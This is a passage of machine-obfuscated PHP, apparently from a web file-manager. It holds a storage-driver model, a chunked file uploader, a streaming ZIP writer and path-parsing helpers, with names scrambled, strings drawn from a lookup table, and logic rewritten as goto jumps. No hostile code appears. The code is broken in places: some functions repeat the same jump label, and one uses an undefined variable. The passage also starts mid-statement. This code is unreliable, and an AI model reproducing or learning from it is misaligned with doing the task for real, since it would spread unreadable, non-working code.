$Eó) . $dӝ[2243]; $Aиܔȿ = Model($dӝ[707])->query($c); $Aиܔȿ = array_to_keyvalue($Aиܔȿ, $dӝ[364], $dӝ[78]); foreach ($F񯓰 as $cݯ => $D) { $F񯓰[$cݯ][$dӝ[1988]] = isset($Aиܔȿ[$D[$dӝ[364]]]) ? $Aиܔȿ[$D[$dӝ[364]]] : 0; } } public function getConfig($c˕) { $A̟ = parent::listData($c˕); return json_decode($A̟[$_SERVER[놫Ӱ][6]], !0); } public function update($bǿ, $a򵡦) { goto Eҵ߳; bǺ: if (isset($cÆ[$a]) && $cÆ[$a][$C̑߻[364]] != $bǿ) { return !1; } if (isset($a򵡦[$C̑߻[2244]]) && $a򵡦[$C̑߻[2244]] == $C̑߻[493]) { $this->checkConfig($a򵡦); } unset($a򵡦[$C̑߻[2244]]); goto a; a: $bٹڭ = parent::update($bǿ, $a򵡦); if ($bٹڭ && $a򵡦[$C̑߻[34]]) { foreach ($cÆ as $C) { if ($C[$C̑߻[34]] && $C[$C̑߻[364]] != $bǿ) { parent::update($C[$C̑߻[364]], array($C̑߻[34] => 0)); } } } return $bٹڭ; goto a; Eҵ߳: $C̑߻ =& $_SERVER[놫Ӱ]; $a = $a򵡦[$C̑߻[28]]; $cÆ = array_to_keyvalue(parent::listData(), $C̑߻[28]); goto bǺ; a: } public function add($Cѕ) { goto bܐɢ͵; Dι: return $dߩ; goto fǮ; bܐɢ͵: $aϊĜ =& $_SERVER[놫Ӱ]; $Eח = array_to_keyvalue(parent::listData(), $aϊĜ[28]); if (isset($Eח[$Cѕ[$aϊĜ[28]]])) { return !1; } goto DꃚȽ; DꃚȽ: $this->checkConfig($Cѕ); $dߩ = parent::insert($Cѕ); if ($dߩ && $Cѕ[$aϊĜ[34]]) { foreach ($Eח as $fМ) { if ($fМ[$aϊĜ[34]]) { parent::update($fМ[$aϊĜ[364]], array($aϊĜ[34] => 0)); } } } goto Dι; fǮ: } public function checkConfig(&$Cʏ؂) { goto cʾ; D: foreach ($f as $B̅ => $b˵) { $f[$B̅] = trim($b˵); } $F = rtrim($f[$D[995]], $D[8]) . $D[8]; $f٘ = $this->driverType($E); goto fӎ; aߵ: $Cʏ؂[$D[6]] = json_encode($f); $Cʏ؂[$D[89]] = $f٘; return !0; goto B; fӎ: $a = $D[72] . $f٘; $Bݐإ = new $a($f); if (in_array($E, $Bݐإ->objectDriver)) { if (!$Bݐإ->isBucketCors() && !$Bݐإ->setBucketCors()) { show_json(LNG($D[2245]), !1); } } goto b; b: $f⣘ = $Bݐإ->getPath($F . $D[1885]); if (!$Bݐإ->mkfile($f⣘)) { show_json(LNG($D[2246]), !1); } $f[$D[995]] = $F; goto aߵ; cʾ: $D =& $_SERVER[놫Ӱ]; $E = strtolower($Cʏ؂[$D[89]]); $f = json_decode_force($Cʏ؂[$D[6]]); goto D; B: } private function driverType($eۉ) { $cۥފ =& $_SERVER[놫Ӱ]; $E = array($cۥފ[102] => $cۥފ[2247], $cۥފ[58] => $cۥފ[2248], $cۥފ[65] => $cۥފ[996]); if (isset($E[$eۉ])) { return $E[$eۉ]; } return strtoupper($eۉ); } public function driverListSystem() { $f =& $_SERVER[놫Ӱ]; $D최 = parent::listData(); $Aε = array(); foreach ($D최 as $DǮը) { unset($DǮը[$f[184]], $DǮը[$f[106]]); $DǮը[$f[6]] = json_decode_force($DǮը[$f[6]]); $Aε[] = $DǮը; } return $Aε; } public function defaultDriver() { $EД =& $_SERVER[놫Ӱ]; $bù = parent::listData(); $Fܪ = array_filter_by_field($bù, $EД[34], 1); $Fܪ = $Fܪ[0]; if ($Fܪ) { $Fܪ[$EД[6]] = json_decode($Fܪ[$EД[6]], !0); } return $Fܪ; } public function driverInfo($eɹ㧰) { $d݅ =& $_SERVER[놫Ӱ]; $dՅ = array_to_keyvalue(parent::listData(), $d݅[364]); if (!isset($dՅ[$eɹ㧰])) { return !1; } $Eڑ = $dՅ[$eɹ㧰]; $Eڑ[$d݅[6]] = json_decode_force($Eڑ[$d݅[6]]); return $Eڑ; } public function removeWithFile($eϒ) { goto dث; d: $FӔݔ = Model($d䌼[418])->where($EΆ␌)->sum($d䌼[78]); $B = new TaskFileTransfer($d䌼[2249] . $eϒ, $d䌼[2250], $D՚, LNG($d䌼[2251]) . "\x28{$eϒ}\x29"); $B->task[$d䌼[683]] = $FӔݔ; goto E戏; dث: $d䌼 =& $_SERVER[놫Ӱ]; $EΆ␌ = array($d䌼[708] => $eϒ); $D՚ = Model($d䌼[418])->where($EΆ␌)->count(); goto d; E: $c慿 = Model($d䌼[164])->where($EΆ␌)->field($d䌼[2252])->select(); foreach ($c慿 as $d􂞔) { goto e׌; e׌: $b閫 = $d􂞔[$d䌼[76]]; $c蘌Ʈ = $eӛҢ . str_replace("\x7b\x69\x6f\72{$eϒ}\175\57", $d䌼[33], $b閫); if (!IO::exist($b閫)) { $this->removeByFileID($d􂞔[$d䌼[415]]); continue; } goto Cό; Cό: if (!IO::exist($c蘌Ʈ) && !IO::move($b閫, $c蘌Ʈ)) { continue; } $EΆ␌ = array($d䌼[415] => $d􂞔[$d䌼[415]]); $bߗ = array($d䌼[708] => $aБ, $d䌼[76] => $c蘌Ʈ); goto Eֳ; Eֳ: Model($d䌼[164])->where($EΆ␌)->save($bߗ); goto b; b: } return parent::remove($eϒ); goto f; E戏: $Dǿ = KodIO::defaultDriver(); $aБ = $Dǿ[$d䌼[364]]; $eӛҢ = "\173\x69\157\x3a{$aБ}\x7d\57"; goto E; f: } public function progress($C) { return Task::get($_SERVER[놫Ӱ][2249] . $C); } private function removeByFileID($a) { $BƵ =& $_SERVER[놫Ӱ]; $B򉐰 = Model($BƵ[1075])->field($BƵ[2229])->where(array($BƵ[415] => $a))->select(); $B򉐰 = array_to_keyvalue($B򉐰, $BƵ[33], $BƵ[366]); foreach ($B򉐰 as $FԢ) { Model($BƵ[379])->remove($FԢ, !1); } } } goto EԬ; DŠ: if (class_exists($_SERVER[놫Ӱ][1865])) { class Services_JSON_Error extends PEAR_Error { function __construct($CΥ = "\x75\x6e\x6b\156\157\x77\x6e\x20\x65\162\162\157\x72", $bه = null, $fè݃ = null, $cْ = null, $Eމՠ = null) { parent::PEAR_Error($CΥ, $bه, $fè݃, $cْ, $Eމՠ); } } } else { class Services_JSON_Error { function __construct($FФ = "\x75\156\x6b\156\x6f\167\156\x20\x65\162\162\x6f\x72", $F = null, $a = null, $Cؚ = null, $b = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto C; C: $Fچ =& $_SERVER[놫Ӱ]; global $in; $this->in =& $in; goto aʭ; B߆: $this->checkSize(); $this->tempPathInit(); goto d⎔; aʭ: if (!empty($_FILES)) { $d֎ = $_FILES[$Fچ[164]]; $this->uploadFile = $d֎[$Fچ[1866]]; if (!$this->uploadFile && $d֎[$Fچ[1175]] > 0) { show_json($this->errorInfo($d֎[$Fچ[1175]]), !1); } } else { if (isset($in[$Fچ[383]])) { $this->uploadFile = isset($in[$Fچ[1867]]) ? $Fچ[1868] : $Fچ[1710]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto B߆; d⎔: } public function upload() { goto fޮ; B: CacheLock::lock($this->tempFile, 20); $CД = $this->statusGet(); $this->initFileTemp(); goto Bꚗ; d: $B߱ = $this->writeTo($E, $fǗ, $this->tempFile); $eݴ؃ = IO::hashSimple($E); $b = IO::size($E); goto a; Dహ: ignore_timeout(); if (!$this->checkChunkHash($CД)) { $this->showJson($f[1883], !1); } $this->statusSet(!1); goto d҇; E: $CД[$f[1879]][$f[1880] . $F腇ۿ] = array($f[1881] => $dڸ, $f[1009] => $F腇ۿ, $f[78] => $b, $f[161] => $eݴ؃); $this->statusSet($CД); if (count($CД[$f[1879]]) != $CД[$f[1878]]) { $this->showJson($f[1882] . $F腇ۿ, !0); } goto Dహ; d҇: CacheLock::unlock($this->tempFile); return $this->tempFile; goto E鞈޸; aⶃ؅: $E = $this->tempFile . $f[1871] . $F腇ۿ; $b = isset($this->in[$f[513]]) ? intval($this->in[$f[513]]) : 0; $Bє = isset($this->in[$f[1872]]) ? intval($this->in[$f[1872]]) : 0; goto A䯏; A䯏: if ($e͏ʪ > 1 && $Bє <= 0) { show_json($f[1873], !1); } if ($Bє > $b) { $e͏ʪ = 1; } if ($e͏ʪ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto B; fޮ: $f =& $_SERVER[놫Ӱ]; $F腇ۿ = isset($this->in[$f[1869]]) ? intval($this->in[$f[1869]]) : 0; $e͏ʪ = isset($this->in[$f[1870]]) ? intval($this->in[$f[1870]]) : 1; goto aⶃ؅; C: $dڸ = $F腇ۿ * $Bє; $fǗ = @fopen($this->tempFile, $f[1876]); fseek($fǗ, $dڸ); goto d; a: @unlink($E); if (!$B߱) { $this->showJson($f[1877] . $F腇ۿ, !1); } $CД[$f[1878]] = $e͏ʪ; goto E; Bꚗ: $E = $this->moveUploadedFile($E); if ($b > 0 && filesize($E) == 0) { $this->showJson($f[1874], !1); } if (!$E) { $this->showJson(LNG($f[1875]), !1); } goto C; E鞈޸: } private function checkSize() { $c =& $_SERVER[놫Ӱ]; if (phpBuild64() || $this->in[$c[78]] < PHP_INT_MAX) { return; } show_json(LNG($c[1884]), !1); } private function showJson($C߼, $bܥފ) { CacheLock::unlock($this->tempFile); if (!$bܥފ) { return show_json($C߼, $bܥފ); } show_json($C߼, $bܥފ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto Fڨ; eՎ: $this->tempFile = $c蜲 . $b౉[1887] . md5($E߿Κ . $this->in[$b౉[1429]]); goto dװ; Cǡͼ: touch($c蜲 . $b౉[1885]); $E߿Κ = isset($this->in[$b౉[1886]]) ? $this->in[$b౉[1886]] : !1; if (strlen($E߿Κ) < 30) { $E߿Κ = md5(USER_ID . $this->in[$b౉[76]] . $this->fileName . $this->in[$b౉[78]]); } goto eՎ; Fڨ: $b౉ =& $_SERVER[놫Ӱ]; $c蜲 = TEMP_FILES; @mk_dir($c蜲); goto Cǡͼ; dװ: } private function moveUploadedFile($cՄ֔) { $Bǖ =& $_SERVER[놫Ӱ]; $fܑ娻 = $this->uploadFile; if ($fܑ娻 == $Bǖ[1888]) { @file_put_contents($cՄ֔, base64_decode($_REQUEST[$Bǖ[1889]])); } else { if ($fܑ娻 == $Bǖ[1710]) { $aɑÏ = @fopen($cՄ֔, $Bǖ[1419]); $this->writeTo($fܑ娻, $aɑÏ, $cՄ֔); } else { if (!move_uploaded_file($fܑ娻, $cՄ֔)) { return !1; } } } return $cՄ֔; } private function writeTo($cɢ, $Dߺ, $B) { goto c; c: $Fꗟà =& $_SERVER[놫Ӱ]; $Cȣ = $Fꗟà[1890] . $B; $b٣ = CacheLock::lock($Cȣ, 1); goto aݓ; aݓ: $c֨ = @fopen($cɢ, $Fꗟà[1418]); if (!$c֨ || !$Dߺ || !$b٣) { CacheLock::unlock($Cȣ); return !1; } while (!feof($c֨)) { fwrite($Dߺ, fread($c֨, 1024 * 200)); } goto b䬥; b䬥: fclose($c֨); fclose($Dߺ); CacheLock::unlock($Cȣ); goto Bќ; Bќ: return !0; goto a; a: } private function statusGet() { goto F娑; F: $F = !1; if (file_exists($Bя)) { $F = @file_get_contents($Bя); } if ($F) { $this->statusData = unserialize($F); } goto Fͭ; F娑: $E͆ =& $_SERVER[놫Ӱ]; if (is_array($this->statusData)) { return $this->statusData; } $Bя = $this->tempFile . $E͆[1891]; goto F; Fͭ: if (!$this->statusData) { $c = array($E͆[28] => $this->fileName, $E͆[1878] => 0, $E͆[1879] => array()); $this->statusSet($c); } return $this->statusData; goto e׾Ī; e׾Ī: } public function statusSet($fε) { $bӻ = $this->tempFile . $_SERVER[놫Ӱ][1891]; if (!$fε) { if (file_exists($bӻ)) { @unlink($bӻ); } return !0; } $this->statusData = $fε; return file_put_contents($bӻ, serialize($fε)); } private function initFileTemp() { $c =& $_SERVER[놫Ӱ]; if (file_exists($this->tempFile)) { return; } $dŏ = fopen($this->tempFile, $c[1892]); fseek($dŏ, $this->in[$c[78]] - 1, SEEK_SET); fwrite($dŏ, $c[464]); fclose($dŏ); } public function checkChunk() { goto d; bŖǹ: return $fԙԮ; goto a; eɜ: $b墄 = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($b墄[$E[1879]] as $eƅ) { $bÚ = $eƅ[$E[161]]; if ($bÚ) { $fԙԮ[$E[1893] . $eƅ[$E[1009]]] = $bÚ; } } goto bŖǹ; d: $E =& $_SERVER[놫Ӱ]; $fԙԮ = array(); CacheLock::lock($this->tempFile); goto eɜ; a: } private function checkChunkHash($Bӯ) { goto f宫; f宫: $dͯ =& $_SERVER[놫Ӱ]; if (count($Bӯ[$dͯ[1879]]) != $Bӯ[$dͯ[1878]]) { return !1; } $Aᩥ = _get($this->in, $dͯ[1886]); goto b앆; b앆: $F١ = _get($this->in, $dͯ[1894]); if (strlen($F١) == 32 && IO::hashSimple($this->tempFile) == $Aᩥ && IO::hashMd5($this->tempFile) == $F١) { return !0; } $Aё = fopen($this->tempFile, $dͯ[1125]); goto Fߔ; E: return $F↪τ; goto E禲; Fߔ: $F↪τ = !0; foreach ($Bӯ[$dͯ[1879]] as $D) { fseek($Aё, $D[$dͯ[1881]]); $bʣ = PathDriverStream::hash($Aё, $D[$dͯ[78]]); if ($D[$dͯ[161]] != $bʣ) { $F↪τ = !1; break; } } fclose($Aё); goto E; E禲: } public static function fileName() { goto F𢰦; A्: $Fɂ = strtotime($in[$eĒ[1895]]); $Fɂ = $Fɂ ? $Fɂ : time(); $C = strtolower($F㏹); goto e䞾; eĠר: if (!empty($_FILES)) { $F㏹ = $F㏹ ? $F㏹ : $_FILES[$eĒ[164]][$eĒ[383]]; } $F㏹ = str_replace(array($eĒ[94], $eĒ[8]), array($eĒ[8], $eĒ[92]), trim($F㏹)); if (!is_wap()) { return $F㏹; } goto A्; e䞾: if ($C == $eĒ[1896] || $C == $eĒ[1897]) { $F㏹ = date($eĒ[675], $Fɂ) . $eĒ[71] . $in[$eĒ[78]] . $eĒ[1525]; } else { if ($C == $eĒ[1898]) { $F㏹ = date($eĒ[675], $Fɂ) . $eĒ[71] . $in[$eĒ[78]] . $eĒ[1899]; } } return $F㏹; goto aɈ; F𢰦: $eĒ =& $_SERVER[놫Ӱ]; global $in; $F㏹ = isset($in[$eĒ[28]]) ? $in[$eĒ[28]] : $eĒ[33]; goto eĠר; aɈ: } private function errorInfo($bڒ) { $c񃻽 =& $_SERVER[놫Ӱ]; $a = array($c񃻽[1900], $c񃻽[1901], $c񃻽[1902], $c񃻽[1903], $c񃻽[1904], $c񃻽[1905], $c񃻽[1906], $c񃻽[1907]); return $bڒ . $c񃻽[4] . $a[$bڒ]; } } class ZipMake { const VERSION = "\x30\56\62\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($b = null) { $AԈ =& $_SERVER[놫Ӱ]; $this->outputStream = fopen($AԈ[1908], $AԈ[1181]); $this->outputName = $b; $this->needHeaders = !0; } public function addFile($bк, $d֍批) { goto Eч; B: $this->addFileFooter($bк, $bË, $aé, $bȉ, $e, $d˛ϧ); goto A˛; cъǟ: while (!feof($aʥ)) { $C = fread($aʥ, 1048576); $this->send($C); } fclose($aʥ); $aé = hexdec(hash_file($Ḟ[1910], $d֍批)); goto B; Eч: $Ḟ =& $_SERVER[놫Ӱ]; $bк = $this->filterFilename($bк); $bË = static::METHOD_STORE; goto FַΗ; FַΗ: $d˛ϧ = $this->addFileHeader($bк, $bË); $bȉ = $e = filesize($d֍批); $aʥ = fopen($d֍批, $Ḟ[1909]); goto cъǟ; A˛: } public function addFileFromStream($eѨ̱, $D؎) { goto fտ; fտ: $eѨ̱ = $this->filterFilename($eѨ̱); $AцѺ = static::METHOD_STORE; $EŔ¤ = $this->addFileHeader($eѨ̱, $AцѺ); goto Bɫ; b껔: $fɏָ = hash_init($_SERVER[놫Ӱ][1910]); while (!feof($D؎)) { $bӣ = fread($D؎, 1048576); hash_update($fɏָ, $bӣ); $this->send($bӣ); } $E = hexdec(hash_final($fɏָ)); goto c; Bɫ: fseek($D؎, 0, SEEK_END); $F눐 = $C = ftell($D؎); rewind($D؎); goto b껔; c: $this->addFileFooter($eѨ̱, $AцѺ, $E, $F눐, $C, $EŔ¤); goto Bķ; Bķ: } public function finish() { foreach ($this->files as $c) { $this->addCdrFile($c); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($f餖, $dɶ) { goto eƞբ; AȤ: return strlen($D雜) + $E + strlen($AⲴ̂); goto Dȷ; eݽѴ: $e = $this->dosTime(time()); $e쏪Ґ = array(array($a˒[1912], static::FILE_HEADER_SIGNATURE), array($a˒[1913], static::ZIP_VERSION_64), array($a˒[1913], 8), array($a˒[1913], $dɶ), array($a˒[1912], $e), array($a˒[1912], 0), array($a˒[1912], 4294967295), array($a˒[1912], 4294967295), array($a˒[1913], $E), array($a˒[1913], 32)); $f = array(array($a˒[1913], 1), array($a˒[1913], 28), array($a˒[1914], 0), array($a˒[1914], 0), array($a˒[1914], 0), array($a˒[1912], 0)); goto Cݍܜ; Cݍܜ: $D雜 = $this->packFields($e쏪Ґ); $AⲴ̂ = $this->packFields($f); $this->send($D雜 . $f餖 . $AⲴ̂); goto AȤ; eƞբ: $a˒ =& $_SERVER[놫Ӱ]; $f餖 = preg_replace($a˒[1911], $a˒[33], $f餖); $E = strlen($f餖); goto eݽѴ; Dȷ: } protected function addFileFooter($eș, $Bꗴ, $Cذ֌, $dͦϘн, $Aу, $a߲) { $Eؖǃ =& $_SERVER[놫Ӱ]; $B趕ܫ = array(array($Eؖǃ[1912], static::DATA_DESCRIPTOR_SIGNATURE), array($Eؖǃ[1912], $Cذ֌), array($Eؖǃ[1914], $dͦϘн), array($Eؖǃ[1914], $Aу)); $E׺ = $this->packFields($B趕ܫ); $this->send($E׺); $BǕȗ = $a߲ + $dͦϘн + $c¾ú; $this->addToCdr($eș, $Bꗴ, $Cذ֌, $dͦϘн, $Aу, $BǕȗ); } private function addToCdr($e, $BƑ, $F, $DⳄ, $c۠Ƀ, $f̏) { $this->files[] = array($e, $BƑ, $F, $DⳄ, $c۠Ƀ, $this->ofs); $this->ofs += $f̏; } protected function addCdrFile($d̉) { goto Aު; F٤ʤ: $eݵ = $this->dosTime(time()); $E = array(array($B懶[1912], static::CDR_FILE_SIGNATURE), array($B懶[1913], static::ZIP_VERSION_64), array($B懶[1913], static::ZIP_VERSION_64), array($B懶[1913], 8), array($B懶[1913], $CɊ), array($B懶[1912], $eݵ), array($B懶[1912], $Bȡ҉), array($B懶[1912], 4294967295), array($B懶[1912], 4294967295), array($B懶[1913], strlen($fķ)), array($B懶[1913], 32), array($B懶[1913], strlen($a╛ӧ)), array($B懶[1913], 0), array($B懶[1913], 0), array($B懶[1912], 32), array($B懶[1912], 4294967295)); $B = array(array($B懶[1913], 1), array($B懶[1913], 28), array($B懶[1914], $Aȫ), array($B懶[1914], $aӗĉ), array($B懶[1914], $Cޟ), array($B懶[1912], 0)); goto aǡ; Aު: $B懶 =& $_SERVER[놫Ӱ]; list($fķ, $CɊ, $Bȡ҉, $aӗĉ, $Aȫ, $Cޟ) = $d̉; $a╛ӧ = $B懶[33]; goto F٤ʤ; aǡ: $BҎ = $this->packFields($E); $cǈ = $this->packFields($B); $CƊ = $BҎ . $fķ . $a╛ӧ . $cǈ; goto f됼; f됼: $this->send($CƊ); $this->cdr_ofs += strlen($CƊ); goto a䮅; a䮅: } protected function addCdr64Eof() { goto Aȇ; cķ: $aЩ = $this->ofs; $Eې߰ = array(array($Fϗ[1912], static::ZIP64_CDR_EOF_SIGNATURE), array($Fϗ[1914], 44), array($Fϗ[1913], static::ZIP_VERSION_64), array($Fϗ[1913], static::ZIP_VERSION_64), array($Fϗ[1912], 0), array($Fϗ[1912], 0), array($Fϗ[1914], $b⊒), array($Fϗ[1914], $b⊒), array($Fϗ[1914], $b꘻), array($Fϗ[1914], $aЩ)); $F = $this->packFields($Eې߰); goto cɉ; cɉ: $this->send($F); goto a; Aȇ: $Fϗ =& $_SERVER[놫Ӱ]; $b⊒ = count($this->files); $b꘻ = $this->cdr_ofs; goto cķ; a: } protected function addCdr64Locator() { goto F; F: $C͛卝 =& $_SERVER[놫Ӱ]; $C٪ = count($this->files); $D澧֠ = $this->cdr_ofs; goto c; A: $this->send($EѤ); goto c; c: $C = $this->ofs; $e翺 = array(array($C͛卝[1912], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($C͛卝[1912], 0), array($C͛卝[1914], $C + $D澧֠), array($C͛卝[1912], 1)); $EѤ = $this->packFields($e翺); goto A; c: } protected function addCdrEof() { goto dǍ; AѮר: $B弄 = $this->packFields($Ař) . $A䨴; $this->send($B弄); goto C䘌湐; dǍ: $Dǎ =& $_SERVER[놫Ӱ]; $E׋ = count($this->files); $cѣ = $this->cdr_ofs; goto EＵ; EＵ: $Cě = $this->ofs; $A䨴 = $Dǎ[33]; $Ař = array(array($Dǎ[1912], static::CDR_EOF_SIGNATURE), array($Dǎ[1913], 0), array($Dǎ[1913], 0), array($Dǎ[1913], $E׋), array($Dǎ[1913], $E׋), array($Dǎ[1912], 4294967295), array($Dǎ[1912], 4294967295), array($Dǎ[1913], strlen($A䨴))); goto AѮר; C䘌湐: } protected function addCdr() { foreach ($this->files as $c) { $this->addCdrFile($c); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $FĆ =& $_SERVER[놫Ӱ]; $Dٴ = $FĆ[199]; if ($this->outputName) { $DԏǄ = trim(str_replace(array($FĆ[112], $FĆ[55], $FĆ[94], $FĆ[68], $FĆ[214], $FĆ[714]), $FĆ[33], $this->outputName)); $Bӂ = rawurlencode($DԏǄ); $Dٴ .= "\73\40\x66\x69\154\x65\x6e\141\x6d\x65\x2a\x3d\x75\164\146\55\x38\47\x27{$Bӂ}"; } $E = array($FĆ[196] => $FĆ[1915], $FĆ[1916] => $Dٴ, $FĆ[1917] => $FĆ[1918], $FĆ[1919] => $FĆ[1920], $FĆ[1921] => $FĆ[1922]); foreach ($E as $FŊϓ => $B) { header($FŊϓ . $FĆ[873] . $B); } } protected function send($dݕ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $dݕ); } protected final function dosTime($A) { $f =& $_SERVER[놫Ӱ]; $F㈫ = getdate($A); if ($F㈫[$f[1622]] < 1980) { $F㈫ = array($f[1622] => 1980, $f[1923] => 1, $f[1924] => 1, $f[1925] => 0, $f[1926] => 0, $f[1927] => 0); } $F㈫[$f[1622]] -= 1980; return $F㈫[$f[1622]] << 25 | $F㈫[$f[1923]] << 21 | $F㈫[$f[1924]] << 16 | $F㈫[$f[1925]] << 11 | $F㈫[$f[1926]] << 5 | $F㈫[$f[1927]] >> 1; } protected function packFields($Dᒿ) { $DЎߏ =& $_SERVER[놫Ӱ]; $fѺȽ = $DЎߏ[33]; $aۊ = array(); foreach ($Dᒿ as $aو) { $fѺȽ .= $aو[0]; $aۊ[] = $aو[1]; } array_unshift($aۊ, $fѺȽ); return call_user_func_array($DЎߏ[1928], $aۊ); } protected function filterFilename($AԲ) { $eߠ =& $_SERVER[놫Ӱ]; return str_replace(array($eߠ[94], $eߠ[4], $eߠ[173], $eߠ[70], $eߠ[112], $eߠ[918], $eߠ[921], $eߠ[268]), $eߠ[71], $AԲ); } } goto Fꌱ섷; Cߔۊ: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\x52\x65\x63\171\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\x46\151\154\x65\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\106\x69\x6c\145\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\x75\160\x52\x6f\x6f\x74\x53\x65\154\x66\175"; const KOD_USER_SHARE = "\173\165\163\x65\x72\x53\x68\141\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\x53\x68\141\162\145\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\x65\x54\157\115\145\175"; const KOD_SHARE_ITEM = "\173\163\150\141\162\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\x65\x49\164\x65\155\x4c\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\163\x65\141\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\154\157\143\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\145\162\122\x65\x6e\x63\x65\156\164\175"; const KOD_USER_DRIVER = "\173\165\x73\145\x72\104\162\x69\x76\x65\x72\175"; public static function typeList() { $bٵ =& $_SERVER[놫Ӱ]; return array($bٵ[1019] => self::KOD_SOURCE, $bٵ[1020] => self::KOD_USER_RECYCLE, $bٵ[1021] => self::KOD_USER_FAV, $bٵ[1022] => self::KOD_USER_FILE_TAG, $bٵ[1023] => self::KOD_USER_FILE_TYPE, $bٵ[1024] => self::KOD_GROUP_ROOT_SELF, $bٵ[1025] => self::KOD_USER_SHARE, $bٵ[1026] => self::KOD_USER_SHARE_LINK, $bٵ[1027] => self::KOD_USER_SHARE_TO_ME, $bٵ[1028] => self::KOD_SHARE_ITEM, $bٵ[1029] => self::KOD_SHARE_LINK, $bٵ[1030] => self::KOD_SEARCH, $bٵ[1031] => self::KOD_BLOCK, $bٵ[1032] => self::KOD_IO, $bٵ[1033] => self::KOD_USER_RECENT, $bٵ[1034] => self::KOD_USER_DRIVER); } public static function parse($bσ) { goto F蹝Ũ; e: preg_match($dР[1035], $bσ, $b̳); $dھ֗ = array($dР[385] => !1, $dР[1036] => !1, $dР[382] => !1, $dР[76] => $bσ, $dР[984] => !1, $dР[983] => $dР[33]); if (is_array($b̳) && count($b̳) == 5) { $a = $dР[1037] . $b̳[2] . $dР[312]; if (in_array($a, $f)) { $dھ֗[$dР[984]] = $b̳[1]; $dھ֗[$dР[29]] = $a; $dھ֗[$dР[1038]] = substr($a, 1, -1); $dھ֗[$dР[364]] = $b̳[3]; } $dھ֗[$dР[983]] = $b̳[4]; } goto Aǫ͗; F蹝Ũ: $dР =& $_SERVER[놫Ӱ]; $bσ = self::clear($bσ); $f = array_values(self::typeList()); goto e; Aǫ͗: return $dھ֗; goto C; C: } public static function clear($a) { goto aݵ; f眈: if ($a == $C׫ݾ[8]) { return $C׫ݾ[8]; } $a = rtrim($a, $C׫ݾ[8]); return $a; goto bă; aݵ: $C׫ݾ =& $_SERVER[놫Ӱ]; $a = str_replace($C׫ݾ[94], $C׫ݾ[8], $a); $cܳ = $C׫ݾ[1039]; goto Fنɖܸ; Fنɖܸ: if (substr($a, 0, 3) == $C׫ݾ[1040]) { $a = substr($a, 3); } while (strstr($a, $cܳ)) { $a = str_replace($cܳ, $C׫ݾ[8], $a); } $a = preg_replace($C׫ݾ[1041], $C׫ݾ[8], $a); goto f眈; bă: } public static function sourceID($aڐ) { $dɫ =& $_SERVER[놫Ӱ]; $FՎ֘ = self::parse($aڐ); if ($FՎ֘[$dɫ[29]] !== self::KOD_SOURCE) { show_json(LNG($dɫ[1042]), !1); } return $FՎ֘[$dɫ[364]]; } public static function make($Dهה) { if (!$Dهה) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Dهה)); } public static function makeShare($a, $b۶) { return self::makePath(self::KOD_SHARE_ITEM, $a, $b۶); } public static function makeFileTypePath($dƹƧ) { return self::makePath(self::KOD_USER_FILE_TYPE, $dƹƧ); } public static function makeFileTagPath($cϯ) { return self::makePath(self::KOD_USER_FILE_TAG, $cϯ); } public static function makePath($Aے, $EϹψ = '', $Eߩٵ = '') { $Bɒ =& $_SERVER[놫Ӱ]; $eݒ = substr($Aے, 1, -1); $a嫙 = $Bɒ[1043] . $eݒ . $Bɒ[720] . $EϹψ . $Bɒ[1044]; $a嫙 = $Eߩٵ ? $a嫙 . $Eߩٵ . $Bɒ[8] : $a嫙; return $a嫙; } public static function hashPath($Dʥ) { $eꐺȩ =& $_SERVER[놫Ӱ]; $B悸 = is_array($Dʥ) ? $Dʥ : IO::info($Dʥ); $Fհޚ = _get($B悸, $eꐺȩ[1045], $eꐺȩ[33]); if (!$Fհޚ) { $fϓǏ = KodIO::parse($B悸[$eꐺȩ[76]]); if (!$fϓǏ[$eꐺȩ[29]]) { $Fհޚ = IO::hashSimple($B悸[$eꐺȩ[76]]); } } if (!$Fհޚ) { $Fհޚ = md5($B悸[$eꐺȩ[76]] . $B悸[$eꐺȩ[78]] . $B悸[$eꐺȩ[106]]); } return $Fհޚ; } public static function initSystemPath() { $Aө =& $_SERVER[놫Ӱ]; $e삨 = array($Aө[1046] => $Aө[1047], $Aө[1048] => $Aө[1049], $Aө[1050] => $Aө[1051], $Aө[1052] => $Aө[1053]); foreach ($e삨 as $FݞҺ => $D) { if 